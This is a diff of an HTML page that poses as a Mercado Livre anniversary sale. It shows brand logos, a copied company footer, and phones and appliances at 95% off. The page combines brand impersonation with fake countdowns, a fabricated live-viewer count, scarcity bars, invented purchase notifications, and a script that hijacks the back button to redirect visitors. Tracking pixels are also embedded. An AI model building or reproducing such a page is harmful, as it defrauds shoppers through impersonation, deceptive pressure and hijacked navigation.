@@ -1,14 +1,13 @@
-<html lang="pt"><head>
-    
-        <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
-    <title>Mercado Livre</title>
-    <link rel="stylesheet" href="css/products.css">
-    <link rel="stylesheet" href="css/styles.css">
-    <link rel="stylesheet" href="css/fonts.css">
-    <link rel="stylesheet" href="family%253DMaterial%252BSymbols%252BOutlined_opsz%252Cwght%252CFILL%252CGRAD%254024%252C400%252C1%252C0">
-    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined">
-
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<title>Mercado Livre - Ofertas Exclusivas 25 Anos</title>
+<link rel="icon" href="images/favicon.png">
+<link rel="shortcut icon" href="images/favicon.png">
+<link rel="stylesheet" href="css/fonts.css">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:opsz,wght,FILL,GRAD@24,400,1,0">
 
 <!-- Meta Pixel Code -->
 <script>
@@ -40,6 +39,7 @@ var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n
 </script>
 <!-- TikTok Pixel Code End -->
 
+<!-- UTMify Pixel -->
 <script>
   window.pixelId = "699df39a5e21aedf65f652e7";
   var a = document.createElement("script");
@@ -48,844 +48,1068 @@ var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n
   a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
   document.head.appendChild(a);
 </script>
- 
-<script src="js/latest.js" data-utmify-prevent-xcod-sck="" data-utmify-prevent-subids="" async="" defer=""></script>
-    <script>
-  // ALTERE O LINK PARA A PÁGINA QUE QUISER MOSTRAR QUANDO O USUÁRIO TENTAR SAIR
-  const link = '';
 
+<script src="js/latest.js" data-utmify-prevent-xcod-sck="" data-utmify-prevent-subids="" async defer></script>
+
+<!-- Back redirect script -->
+<script>
+  const link = '';
   function setBackRedirect(url) {
     let urlBackRedirect = url;
     urlBackRedirect = urlBackRedirect =
       urlBackRedirect.trim() +
       (urlBackRedirect.indexOf('?') > 0 ? '&' : '?') +
       document.location.search.replace('?', '').toString();
-
     history.pushState({}, '', location.href);
     history.pushState({}, '', location.href);
     history.pushState({}, '', location.href);
-
     window.addEventListener('popstate', () => {
-      console.log('onpopstate', urlBackRedirect);
-      setTimeout(() => {
-        location.href = urlBackRedirect;
-      }, 1);
+      setTimeout(() => { location.href = urlBackRedirect; }, 1);
+    });
+  }
+  setBackRedirect(link);
+</script>
+
+<style>
+/* ============================================
+   RESET & BASE
+   ============================================ */
+*, *::before, *::after { margin: 0; padding: 0; box-sizing: border-box; }
+html { scroll-behavior: smooth; -webkit-tap-highlight-color: transparent; }
+body {
+  font-family: 'GellixRegular', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+  background: #f5f5f5;
+  color: #333;
+  overflow-x: hidden;
+  -webkit-font-smoothing: antialiased;
+}
+
+/* ============================================
+   TOP PROMO BANNER
+   ============================================ */
+.top-banner {
+  background: linear-gradient(135deg, #ffe600 0%, #f5d000 100%);
+  text-align: center;
+  padding: 8px 16px;
+  font-family: 'GellixSemiBold', sans-serif;
+  font-size: 12px;
+  color: #333;
+  letter-spacing: 0.3px;
+  position: relative;
+  overflow: hidden;
+}
+.top-banner::after {
+  content: '';
+  position: absolute;
+  top: 0; left: -100%;
+  width: 200%; height: 100%;
+  background: linear-gradient(90deg, transparent 0%, rgba(255,255,255,0.15) 50%, transparent 100%);
+  animation: shimmerBanner 4s ease-in-out infinite;
+}
+@keyframes shimmerBanner {
+  0% { transform: translateX(-50%); }
+  100% { transform: translateX(50%); }
+}
+
+/* ============================================
+   NAVBAR
+   ============================================ */
+.navbar {
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  padding: 12px 16px;
+  background: #fff;
+  border-bottom: 1px solid #eee;
+  position: sticky;
+  top: 0;
+  z-index: 100;
+  box-shadow: 0 1px 4px rgba(0,0,0,0.04);
+}
+.nav-logo img {
+  height: 32px;
+  width: auto;
+}
+.nav-cart {
+  position: relative;
+  cursor: pointer;
+  padding: 6px;
+  border-radius: 50%;
+  transition: background 0.2s;
+}
+.nav-cart:active { background: rgba(0,0,0,0.05); }
+.nav-cart .material-symbols-outlined {
+  font-size: 28px;
+  color: #333;
+}
+.cart-badge {
+  position: absolute;
+  top: 0; right: 0;
+  background: #3483fa;
+  color: #fff;
+  font-family: 'GellixBold', sans-serif;
+  font-size: 10px;
+  min-width: 18px;
+  height: 18px;
+  border-radius: 9px;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  padding: 0 4px;
+  transform: scale(0);
+  transition: transform 0.3s cubic-bezier(0.34, 1.56, 0.64, 1);
+}
+.cart-badge.visible { transform: scale(1); }
+
+/* Cart toast */
+.cart-toast {
+  position: fixed;
+  bottom: 80px;
+  left: 50%;
+  transform: translateX(-50%) translateY(30px);
+  background: #333;
+  color: #fff;
+  font-family: 'GellixMedium', sans-serif;
+  font-size: 13px;
+  padding: 10px 20px;
+  border-radius: 8px;
+  opacity: 0;
+  pointer-events: none;
+  transition: all 0.3s ease;
+  z-index: 999;
+  white-space: nowrap;
+  box-shadow: 0 4px 12px rgba(0,0,0,0.15);
+}
+.cart-toast.show {
+  opacity: 1;
+  transform: translateX(-50%) translateY(0);
+}
+
+/* ============================================
+   HERO BANNER
+   ============================================ */
+.hero-banner {
+  width: 100%;
+  display: block;
+  margin-top: -1px;
+}
+.hero-banner img {
+  width: 100%;
+  height: auto;
+  display: block;
+}
+
+/* ============================================
+   COUNTDOWN / OFFER TIMER
+   ============================================ */
+.countdown-bar {
+  margin: 12px 16px;
+  border-radius: 12px;
+  background: linear-gradient(135deg, #011E51 0%, #1a3a7a 40%, #6b2fa0 80%, #a52aad 100%);
+  padding: 12px 16px;
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  color: #fff;
+  box-shadow: 0 4px 16px rgba(1,30,81,0.25);
+  position: relative;
+  overflow: hidden;
+}
+.countdown-bar::before {
+  content: '';
+  position: absolute;
+  top: -50%; left: -50%;
+  width: 200%; height: 200%;
+  background: radial-gradient(circle, rgba(255,255,255,0.05) 0%, transparent 60%);
+  animation: pulseGlow 3s ease-in-out infinite;
+}
+@keyframes pulseGlow {
+  0%, 100% { opacity: 0.5; transform: scale(1); }
+  50% { opacity: 1; transform: scale(1.05); }
+}
+.countdown-left {
+  display: flex;
+  align-items: center;
+  gap: 8px;
+  z-index: 1;
+}
+.countdown-left .material-symbols-outlined {
+  font-size: 20px;
+  color: #ffe600;
+}
+.countdown-label {
+  font-family: 'GellixMedium', sans-serif;
+  font-size: 13px;
+}
+.countdown-timer {
+  display: flex;
+  gap: 4px;
+  z-index: 1;
+}
+.time-block {
+  background: rgba(255,255,255,0.15);
+  backdrop-filter: blur(4px);
+  border-radius: 6px;
+  padding: 4px 8px;
+  min-width: 36px;
+  text-align: center;
+}
+.time-block .num {
+  font-family: 'GellixBold', sans-serif;
+  font-size: 16px;
+  display: block;
+  line-height: 1.2;
+}
+.time-block .unit {
+  font-size: 8px;
+  opacity: 0.8;
+  text-transform: uppercase;
+  letter-spacing: 0.5px;
+}
+.time-sep {
+  font-family: 'GellixBold', sans-serif;
+  font-size: 16px;
+  line-height: 28px;
+  opacity: 0.6;
+}
+
+/* ============================================
+   SECTION HEADERS
+   ============================================ */
+.section-header {
+  padding: 16px 16px 8px;
+  display: flex;
+  align-items: center;
+  gap: 8px;
+}
+.section-header .material-symbols-outlined {
+  font-size: 22px;
+  color: #3483fa;
+}
+.section-header h2 {
+  font-family: 'GellixBold', sans-serif;
+  font-size: 17px;
+  color: #333;
+}
+.section-subtext {
+  padding: 0 16px 12px;
+  font-size: 12px;
+  color: #888;
+  font-family: 'GellixRegular', sans-serif;
+}
+
+/* ============================================
+   PRODUCT GRID
+   ============================================ */
+.product-grid {
+  display: grid;
+  grid-template-columns: repeat(2, 1fr);
+  gap: 10px;
+  padding: 0 12px 16px;
+}
+
+/* ============================================
+   PRODUCT CARD (MODERN)
+   ============================================ */
+.product-card {
+  background: #fff;
+  border-radius: 12px;
+  overflow: hidden;
+  box-shadow: 0 1px 4px rgba(0,0,0,0.06);
+  transition: transform 0.2s ease, box-shadow 0.2s ease;
+  cursor: pointer;
+  position: relative;
+  display: flex;
+  flex-direction: column;
+}
+.product-card:active {
+  transform: scale(0.97);
+  box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+}
+
+/* Offer badge */
+.card-badge {
+  position: absolute;
+  top: 8px;
+  left: 8px;
+  background: linear-gradient(135deg, #3483fa, #2968cc);
+  color: #fff;
+  font-family: 'GellixSemiBold', sans-serif;
+  font-size: 9px;
+  padding: 3px 8px;
+  border-radius: 4px;
+  letter-spacing: 0.5px;
+  z-index: 2;
+  text-transform: uppercase;
+}
+
+/* Discount circle */
+.card-discount {
+  position: absolute;
+  top: 8px;
+  right: 8px;
+  background: #00a650;
+  color: #fff;
+  font-family: 'GellixBold', sans-serif;
+  font-size: 11px;
+  width: 40px;
+  height: 40px;
+  border-radius: 50%;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  z-index: 2;
+  line-height: 1;
+  box-shadow: 0 2px 6px rgba(0,166,80,0.3);
+}
+
+/* Image area */
+.card-image {
+  width: 100%;
+  aspect-ratio: 1;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  padding: 16px 12px 8px;
+  background: #fafafa;
+  position: relative;
+}
+.card-image img {
+  max-height: 120px;
+  max-width: 90%;
+  width: auto;
+  height: auto;
+  object-fit: contain;
+  transition: transform 0.3s ease;
+}
+.product-card:active .card-image img {
+  transform: scale(1.03);
+}
+
+/* Shipping badge inside image */
+.shipping-badge {
+  position: absolute;
+  bottom: 6px;
+  left: 8px;
+  display: flex;
+  align-items: center;
+  gap: 2px;
+  background: rgba(232,240,254,0.95);
+  padding: 2px 8px;
+  border-radius: 4px;
+  font-family: 'GellixMedium', sans-serif;
+  font-size: 10px;
+  color: #00a650;
+}
+.shipping-badge .material-symbols-outlined {
+  font-size: 14px;
+  color: #00a650;
+}
+.shipping-badge .full-text {
+  font-family: 'GellixBold', sans-serif;
+  color: #00a650;
+}
+
+/* Card body / info */
+.card-body {
+  padding: 10px 10px 12px;
+  flex: 1;
+  display: flex;
+  flex-direction: column;
+  gap: 4px;
+}
+.card-name {
+  font-family: 'GellixMedium', sans-serif;
+  font-size: 12px;
+  color: #333;
+  line-height: 1.3;
+  display: -webkit-box;
+  -webkit-line-clamp: 2;
+  -webkit-box-orient: vertical;
+  overflow: hidden;
+  min-height: 31px;
+}
+
+/* Price section */
+.card-price-section {
+  margin-top: auto;
+}
+.card-old-price {
+  font-family: 'GellixRegular', sans-serif;
+  font-size: 10px;
+  color: #999;
+  text-decoration: line-through;
+}
+.card-price-row {
+  display: flex;
+  align-items: baseline;
+  gap: 4px;
+  margin-top: 1px;
+}
+.card-new-price {
+  font-family: 'GellixBold', sans-serif;
+  font-size: 16px;
+  color: #333;
+}
+.card-installments {
+  font-family: 'GellixRegular', sans-serif;
+  font-size: 9px;
+  color: #00a650;
+  margin-top: 1px;
+}
+
+/* Stock indicator (modern) */
+.stock-indicator {
+  margin-top: 6px;
+  border-radius: 6px;
+  overflow: hidden;
+  position: relative;
+}
+.stock-bar-bg {
+  width: 100%;
+  height: 6px;
+  background: #e8e8e8;
+  border-radius: 3px;
+  overflow: hidden;
+}
+.stock-bar-fill {
+  height: 100%;
+  border-radius: 3px;
+  transition: width 1s ease-out;
+}
+.stock-bar-fill.high { background: linear-gradient(90deg, #00a650, #00c853); }
+.stock-bar-fill.medium { background: linear-gradient(90deg, #ff9800, #ffb74d); }
+.stock-bar-fill.low { background: linear-gradient(90deg, #f44336, #e57373); }
+.stock-bar-fill.low { animation: pulseLow 1.5s ease-in-out infinite; }
+@keyframes pulseLow {
+  0%, 100% { opacity: 1; }
+  50% { opacity: 0.7; }
+}
+.stock-text {
+  font-family: 'GellixMedium', sans-serif;
+  font-size: 9px;
+  margin-top: 3px;
+  display: flex;
+  align-items: center;
+  gap: 3px;
+}
+.stock-text.high { color: #00a650; }
+.stock-text.medium { color: #e68a00; }
+.stock-text.low { color: #e53935; }
+.stock-text .material-symbols-outlined { font-size: 12px; }
+
+/* ============================================
+   SOLD OUT CARD
+   ============================================ */
+.product-card.sold-out {
+  opacity: 0.5;
+  pointer-events: none;
+}
+.product-card.sold-out .card-image::after {
+  content: '';
+  position: absolute;
+  inset: 0;
+  background: rgba(255,255,255,0.5);
+}
+.sold-out-badge {
+  position: absolute;
+  top: 50%;
+  left: 50%;
+  transform: translate(-50%, -50%) rotate(-15deg);
+  background: #e53935;
+  color: #fff;
+  font-family: 'GellixBold', sans-serif;
+  font-size: 11px;
+  padding: 4px 14px;
+  border-radius: 4px;
+  z-index: 5;
+  letter-spacing: 1px;
+  box-shadow: 0 2px 8px rgba(229,57,53,0.3);
+}
+
+/* ============================================
+   SOCIAL PROOF LIVE COUNTER
+   ============================================ */
+.live-counter {
+  margin: 12px 16px;
+  background: #fff;
+  border-radius: 10px;
+  padding: 10px 14px;
+  display: flex;
+  align-items: center;
+  gap: 10px;
+  box-shadow: 0 1px 4px rgba(0,0,0,0.06);
+}
+.live-dot {
+  width: 8px;
+  height: 8px;
+  background: #e53935;
+  border-radius: 50%;
+  animation: livePulse 1.5s ease-in-out infinite;
+  flex-shrink: 0;
+}
+@keyframes livePulse {
+  0%, 100% { box-shadow: 0 0 0 0 rgba(229,57,53,0.4); }
+  50% { box-shadow: 0 0 0 6px rgba(229,57,53,0); }
+}
+.live-counter span {
+  font-family: 'GellixMedium', sans-serif;
+  font-size: 12px;
+  color: #666;
+}
+.live-counter strong {
+  font-family: 'GellixBold', sans-serif;
+  color: #333;
+}
+
+/* ============================================
+   TRUST BADGES
+   ============================================ */
+.trust-section {
+  margin: 8px 16px 16px;
+  display: grid;
+  grid-template-columns: repeat(3, 1fr);
+  gap: 8px;
+}
+.trust-badge {
+  background: #fff;
+  border-radius: 10px;
+  padding: 12px 8px;
+  text-align: center;
+  box-shadow: 0 1px 4px rgba(0,0,0,0.04);
+}
+.trust-badge .material-symbols-outlined {
+  font-size: 24px;
+  color: #3483fa;
+  margin-bottom: 4px;
+}
+.trust-badge .trust-label {
+  font-family: 'GellixMedium', sans-serif;
+  font-size: 9px;
+  color: #666;
+  line-height: 1.3;
+}
+
+/* ============================================
+   FOOTER
+   ============================================ */
+.site-footer {
+  background: #fff;
+  padding: 20px 16px;
+  margin-top: 8px;
+  border-top: 1px solid #eee;
+}
+.footer-links {
+  font-family: 'GellixSemiBold', sans-serif;
+  font-size: 11px;
+  color: #333;
+  line-height: 1.8;
+  margin-bottom: 12px;
+}
+.footer-legal {
+  font-family: 'GellixRegular', sans-serif;
+  font-size: 10px;
+  color: #999;
+  line-height: 1.6;
+}
+
+/* ============================================
+   SOCIAL PROOF NOTIFICATION (NOTIFLIX REPLACEMENT)
+   ============================================ */
+.social-notification {
+  position: fixed;
+  bottom: 16px;
+  left: 16px;
+  right: 16px;
+  max-width: 340px;
+  background: #fff;
+  border-radius: 12px;
+  box-shadow: 0 4px 20px rgba(0,0,0,0.12);
+  padding: 12px 14px;
+  display: flex;
+  align-items: center;
+  gap: 10px;
+  transform: translateY(120%);
+  opacity: 0;
+  transition: all 0.4s cubic-bezier(0.34, 1.56, 0.64, 1);
+  z-index: 500;
+  border-left: 3px solid #00a650;
+}
+.social-notification.show {
+  transform: translateY(0);
+  opacity: 1;
+}
+.social-notif-icon {
+  width: 36px;
+  height: 36px;
+  background: linear-gradient(135deg, #00a650, #00c853);
+  border-radius: 50%;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  flex-shrink: 0;
+}
+.social-notif-icon .material-symbols-outlined {
+  font-size: 18px;
+  color: #fff;
+}
+.social-notif-text {
+  flex: 1;
+}
+.social-notif-text strong {
+  font-family: 'GellixBold', sans-serif;
+  font-size: 12px;
+  color: #333;
+}
+.social-notif-text span {
+  font-family: 'GellixRegular', sans-serif;
+  font-size: 11px;
+  color: #666;
+}
+.social-notif-time {
+  font-family: 'GellixRegular', sans-serif;
+  font-size: 9px;
+  color: #aaa;
+  white-space: nowrap;
+}
+
+/* ============================================
+   ANIMATIONS (entrance)
+   ============================================ */
+.product-card {
+  opacity: 0;
+  transform: translateY(20px);
+}
+.product-card.visible {
+  animation: fadeUp 0.4s ease forwards;
+}
+@keyframes fadeUp {
+  to { opacity: 1; transform: translateY(0); }
+}
+
+/* ============================================
+   CATEGORY FILTER PILLS
+   ============================================ */
+.filter-pills {
+  display: flex;
+  gap: 8px;
+  padding: 8px 16px;
+  overflow-x: auto;
+  -webkit-overflow-scrolling: touch;
+  scrollbar-width: none;
+}
+.filter-pills::-webkit-scrollbar { display: none; }
+.filter-pill {
+  flex-shrink: 0;
+  padding: 6px 14px;
+  border-radius: 20px;
+  border: 1px solid #ddd;
+  background: #fff;
+  font-family: 'GellixMedium', sans-serif;
+  font-size: 12px;
+  color: #555;
+  cursor: pointer;
+  transition: all 0.2s;
+  white-space: nowrap;
+}
+.filter-pill:active, .filter-pill.active {
+  background: #3483fa;
+  color: #fff;
+  border-color: #3483fa;
+}
+
+/* ============================================
+   RESPONSIVE TWEAKS
+   ============================================ */
+@media (min-width: 420px) {
+  .card-image img { max-height: 140px; }
+  .card-name { font-size: 13px; }
+  .card-new-price { font-size: 18px; }
+}
+</style>
+</head>
+<body>
+
+<!-- ===== TOP PROMO BANNER ===== -->
+<div class="top-banner">
+  Aproveite <strong>95% de desconto</strong> aplicado automaticamente na sua compra!
+</div>
+
+<!-- ===== NAVBAR ===== -->
+<nav class="navbar">
+  <div class="nav-logo">
+    <img src="images/logo.webp" alt="Mercado Livre 25 Anos">
+  </div>
+  <div class="nav-cart" id="navCart" onclick="handleCartClick()">
+    <span class="material-symbols-outlined">shopping_cart</span>
+    <div class="cart-badge" id="cartBadge">0</div>
+  </div>
+</nav>
+
+<!-- ===== HERO BANNER ===== -->
+<div class="hero-banner">
+  <img src="images/desconto-banner.jpg" alt="Super Desconto 95% OFF">
+</div>
+
+<!-- ===== COUNTDOWN TIMER ===== -->
+<div class="countdown-bar">
+  <div class="countdown-left">
+    <span class="material-symbols-outlined">timer</span>
+    <span class="countdown-label">Oferta expira em</span>
+  </div>
+  <div class="countdown-timer" id="countdownTimer">
+    <div class="time-block"><span class="num" id="cdH">01</span><span class="unit">hrs</span></div>
+    <span class="time-sep">:</span>
+    <div class="time-block"><span class="num" id="cdM">25</span><span class="unit">min</span></div>
+    <span class="time-sep">:</span>
+    <div class="time-block"><span class="num" id="cdS">39</span><span class="unit">seg</span></div>
+  </div>
+</div>
+
+<!-- ===== LIVE COUNTER ===== -->
+<div class="live-counter">
+  <div class="live-dot"></div>
+  <span><strong id="liveViewers">247</strong> pessoas vendo essas ofertas agora</span>
+</div>
+
+<!-- ===== TRUST BADGES ===== -->
+<div class="trust-section">
+  <div class="trust-badge">
+    <span class="material-symbols-outlined">verified_user</span>
+    <div class="trust-label">Compra<br>Garantida</div>
+  </div>
+  <div class="trust-badge">
+    <span class="material-symbols-outlined">local_shipping</span>
+    <div class="trust-label">Frete<br>FULL</div>
+  </div>
+  <div class="trust-badge">
+    <span class="material-symbols-outlined">autorenew</span>
+    <div class="trust-label">Devolucao<br>Gratis</div>
+  </div>
+</div>
+
+<!-- ===== CATEGORY FILTERS ===== -->
+<div class="filter-pills">
+  <div class="filter-pill active" data-cat="todos">Todos</div>
+  <div class="filter-pill" data-cat="celular">Celulares</div>
+  <div class="filter-pill" data-cat="eletro">Eletro</div>
+  <div class="filter-pill" data-cat="audio">Audio</div>
+  <div class="filter-pill" data-cat="casa">Casa</div>
+  <div class="filter-pill" data-cat="gaming">Gaming</div>
+</div>
+
+<!-- ===== SECTION HEADER ===== -->
+<div class="section-header">
+  <span class="material-symbols-outlined">bolt</span>
+  <h2>Ofertas com ate 95% OFF</h2>
+</div>
+<div class="section-subtext">Precos exclusivos do aniversario de 25 anos</div>
+
+<!-- ===== PRODUCT GRID ===== -->
+<div class="product-grid" id="productGrid">
+  <!-- Products will be injected by JS -->
+</div>
+
+<!-- ===== FOOTER ===== -->
+<div class="site-footer">
+  <div class="footer-links">Termos e condicoes &middot; Privacidade &middot; Acessibilidade &middot; Blog &middot; Afiliados &middot; Tendencias</div>
+  <div class="footer-legal">&copy; 1999-2024 Ebazar.com.br LTDA. CNPJ n.o 03.007.331/0001-41 / Av. das Nacoes Unidas, no 3.003, Bonfim, Osasco/SP - CEP 06233-903 - empresa do grupo Mercado Livre.<br><br><strong>Brasil/Portugues</strong></div>
+</div>
+
+<!-- CART TOAST -->
+<div class="cart-toast" id="cartToast">Seu carrinho esta vazio. Escolha um produto!</div>
+
+<!-- SOCIAL PROOF NOTIFICATION -->
+<div class="social-notification" id="socialNotif">
+  <div class="social-notif-icon">
+    <span class="material-symbols-outlined">shopping_bag</span>
+  </div>
+  <div class="social-notif-text">
+    <strong id="socialName">Carlos</strong>
+    <span id="socialMsg"> comprou com 95% OFF</span>
+  </div>
+  <div class="social-notif-time" id="socialTime">agora</div>
+</div>
+
+<!-- ============================================
+     JAVASCRIPT
+     ============================================ -->
+<script>
+/* ===== PRODUCT DATA ===== */
+var products = [
+  { id:'jbl01', name:'JBL Boombox 3 Preta', image:'images/poco_preto.png', oldPrice:'R$ 2.999,90', newPrice:'R$ 67,79', stock:19, maxStock:30, cat:'audio', tag:'OFERTA DO DIA' },
+  { id:'projetor04', name:'Samsung The Freestyle Projetor Smart Portatil', image:'images/1.webp', oldPrice:'R$ 4.398,00', newPrice:'R$ 97,90', stock:10, maxStock:25, cat:'eletro', tag:'OFERTA DO DIA' },
+  { id:'jbl02', name:'JBL Partybox 710 Preta', image:'images/JBL2.webp', oldPrice:'R$ 5.398,00', newPrice:'R$ 89,98', stock:10, maxStock:25, cat:'audio', tag:'OFERTA DO DIA' },
+  { id:'lilo', name:'Pelucia Stitch Grande Disney', image:'images/1.jpg', oldPrice:'R$ 398,00', newPrice:'R$ 79,29', stock:24, maxStock:40, cat:'casa', tag:'OFERTA DISNEY' },
+  { id:'sam25', name:'Samsung Galaxy S25 Ultra 5G 512GB Titanio Preto', image:'images/s1.jpg', oldPrice:'R$ 10.398,00', newPrice:'R$ 247,90', stock:16, maxStock:30, cat:'celular', tag:'OFERTA DO DIA' },
+  { id:'iphone16-preto', name:'iPhone 16 Pro Max (1T) Titanio Preto', image:'images/iphon1.jpg', oldPrice:'R$ 12.895,00', newPrice:'R$ 257,00', stock:8, maxStock:20, cat:'celular', tag:'OFERTA DO DIA' },
+  { id:'fritadeira', name:'Air Fryer Fritadeira Eletrica', image:'images/f1.jpg', oldPrice:'R$ 529,99', newPrice:'R$ 81,24', stock:15, maxStock:30, cat:'eletro', tag:'OFERTA DO DIA' },
+  { id:'xiaome', name:'Xiaomi POCO X5 256GB Blue', image:'images/x1_1.jpg', oldPrice:'R$ 1.685,00', newPrice:'R$ 87,00', stock:14, maxStock:25, cat:'celular', tag:'OFERTA DO DIA' },
+  { id:'kitferramenta', name:'Kit Combinado 7 Ferramentas DEWALT', image:'images/ferramenta.jpg', oldPrice:'R$ 1.050,90', newPrice:'R$ 83,97', stock:8, maxStock:20, cat:'casa', tag:'OFERTA DO DIA' },
+  { id:'iph06', name:'iPhone 15 Pro (256GB) Titanio Branco', image:'images/iphone_15_pro_max_titanio_branco.jpg', oldPrice:'R$ 5.849,10', newPrice:'R$ 117,58', stock:7, maxStock:20, cat:'celular', tag:'OFERTA DO DIA' },
+  { id:'iph07', name:'iPhone 15 (256GB) Rosa', image:'images/iphone_15_rosa.jpg', oldPrice:'R$ 5.849,10', newPrice:'R$ 97,90', stock:6, maxStock:20, cat:'celular', tag:'OFERTA DO DIA' },
+  { id:'iph08', name:'iPhone 15 Pro Max (512GB) Titanio Preto', image:'images/iphone_15_pro_max_titanio_preto.jpg', oldPrice:'R$ 6.199,00', newPrice:'R$ 134,90', stock:8, maxStock:20, cat:'celular', tag:'OFERTA DO DIA' },
+  { id:'geladeira', name:'Geladeira Brastemp 588L Inox 220V', image:'images/geladeira.jpg', oldPrice:'R$ 3.999,00', newPrice:'R$ 167,82', stock:18, maxStock:30, cat:'eletro', tag:'OFERTA DO DIA' },
+  { id:'xiaomex6', name:'Xiaomi Poco X6 Pro 256GB Preto', image:'images/x1_2.jpg', oldPrice:'R$ 3.527,00', newPrice:'R$ 97,37', stock:9, maxStock:20, cat:'celular', tag:'OFERTA DO DIA' },
+  { id:'xiaomex7', name:'Xiaomi Poco X7 Pro 512GB+12GB 2025', image:'images/x1.jpg', oldPrice:'R$ 3.999,00', newPrice:'R$ 148,89', stock:12, maxStock:25, cat:'celular', tag:'OFERTA DO DIA' },
+  { id:'aspirador', name:'Robo Aspirador Robot W90', image:'images/as1.jpg', oldPrice:'R$ 349,00', newPrice:'R$ 94,60', stock:18, maxStock:30, cat:'eletro', tag:'OFERTA DO DIA' },
+  { id:'guarda-branco', name:'Guarda-roupa Casal Easy Slim com Espelho', image:'images/g1_1.jpg', oldPrice:'R$ 1.049,05', newPrice:'R$ 114,60', stock:16, maxStock:30, cat:'casa', tag:'OFERTA DO DIA' },
+  { id:'guarda-preto', name:'Guarda Roupa Casal 8 Portas Preto Fosco', image:'images/g1.jpg', oldPrice:'R$ 1.049,00', newPrice:'R$ 107,00', stock:7, maxStock:20, cat:'casa', tag:'OFERTA DO DIA' },
+  { id:'sofa', name:'Sofa Retratil Reclinavel 2,00m King House', image:'images/s1_2.jpg', oldPrice:'R$ 2.990,05', newPrice:'R$ 79,47', stock:18, maxStock:30, cat:'casa', tag:'OFERTA DO DIA' },
+  { id:'iph09', name:'iPhone 15 Pro (256GB) Titanio', image:'images/iphone_15_pro_titanio.jpg', oldPrice:'R$ 6.999,00', newPrice:'R$ 117,58', stock:4, maxStock:15, cat:'celular', tag:'OFERTA DO DIA' },
+  { id:'tv', name:'Samsung Smart TV 55" QLED 4K 2024', image:'images/tv1.jpg', oldPrice:'R$ 2.999,99', newPrice:'R$ 142,98', stock:12, maxStock:25, cat:'eletro', tag:'OFERTA DO DIA' },
+  { id:'ps5', name:'PlayStation PS5 PRO Branco 2 TB', image:'images/s1_1.jpg', oldPrice:'R$ 6.499,99', newPrice:'R$ 108,17', stock:7, maxStock:20, cat:'gaming', tag:'OFERTA DO DIA' },
+  { id:'microo', name:'Microondas Brastemp 38L Inox', image:'images/m1.jpg', oldPrice:'R$ 1.757,99', newPrice:'R$ 102,16', stock:4, maxStock:15, cat:'eletro', tag:'OFERTA DO DIA' },
+  { id:'lavar', name:'Lava E Seca Samsung Inox 11kg', image:'images/lavar1.jpg', oldPrice:'R$ 3.999,99', newPrice:'R$ 116,90', stock:8, maxStock:20, cat:'eletro', tag:'OFERTA DO DIA' },
+  { id:'ar', name:'Ar Condicionado Split LG 24000 BTUs', image:'images/ar1.webp', oldPrice:'R$ 1.499,90', newPrice:'R$ 114,19', stock:9, maxStock:20, cat:'eletro', tag:'OFERTA DO DIA' },
+  { id:'fogao', name:'Fogao 5 Bocas Atlas Mesa de Vidro 127V/220V', image:'images/f1_1.jpg', oldPrice:'R$ 2.099,90', newPrice:'R$ 99,99', stock:7, maxStock:20, cat:'eletro', tag:'OFERTA DO DIA' }
+];
+
+var soldOutProducts = [
+  { name:'JBL GO 4 Preta', image:'images/poco_antigo.webp' },
+  { name:'iPhone 15 Pro Max (256GB) Azul', image:'images/iphone_15_azul.jpg' },
+  { name:'iPhone 15 Pro Max (256GB) Verde', image:'images/iphone_15_verde.jpg' },
+  { name:'iPhone 15 Pro Max (256GB) Dourado', image:'images/dourado.jpg' },
+  { name:'iPad 10 Titanio Azul', image:'images/ipad_10.jpg' }
+];
+
+/* ===== RENDER PRODUCTS ===== */
+function getStockLevel(stock, max) {
+  var pct = (stock / max) * 100;
+  if (pct > 60) return 'high';
+  if (pct > 30) return 'medium';
+  return 'low';
+}
+function getStockWidth(stock, max) {
+  return Math.max(8, (stock / max) * 100);
+}
+function getStockMessage(stock, level) {
+  if (level === 'low') return '<span class="material-symbols-outlined">warning</span> Ultimas ' + stock + ' un.';
+  if (level === 'medium') return 'Restam ' + stock + ' un.';
+  return 'Em estoque: ' + stock + ' un.';
+}
+
+function calculateInstallments(priceStr) {
+  var cleaned = priceStr.replace(/[^\d,\.]/g, '').replace(/\./g, '').replace(',', '.');
+  var val = parseFloat(cleaned);
+  if (isNaN(val) || val <= 0) return '';
+  var inst = (val / 12).toFixed(2).replace('.', ',');
+  return '12x R$ ' + inst + ' sem juros';
+}
+
+function renderProducts(filter) {
+  var grid = document.getElementById('productGrid');
+  grid.innerHTML = '';
+  var qs = window.location.search;
+
+  // Active products
+  var filtered = filter === 'todos' ? products : products.filter(function(p) { return p.cat === filter; });
+
+  filtered.forEach(function(p, idx) {
+    var level = getStockLevel(p.stock, p.maxStock);
+    var stockW = getStockWidth(p.stock, p.maxStock);
+    var installments = calculateInstallments(p.newPrice);
+
+    var card = document.createElement('div');
+    card.className = 'product-card';
+    card.setAttribute('data-cat', p.cat);
+    card.setAttribute('data-id', p.id);
+    card.style.animationDelay = (idx * 0.05) + 's';
+
+    card.innerHTML =
+      '<div class="card-badge">' + p.tag + '</div>' +
+      '<div class="card-discount">95%<br>OFF</div>' +
+      '<div class="card-image">' +
+        '<img src="' + p.image + '" alt="' + p.name + '" loading="lazy">' +
+        '<div class="shipping-badge">' +
+          '<span class="material-symbols-outlined">bolt</span>' +
+          'Frete <span class="full-text">FULL</span>' +
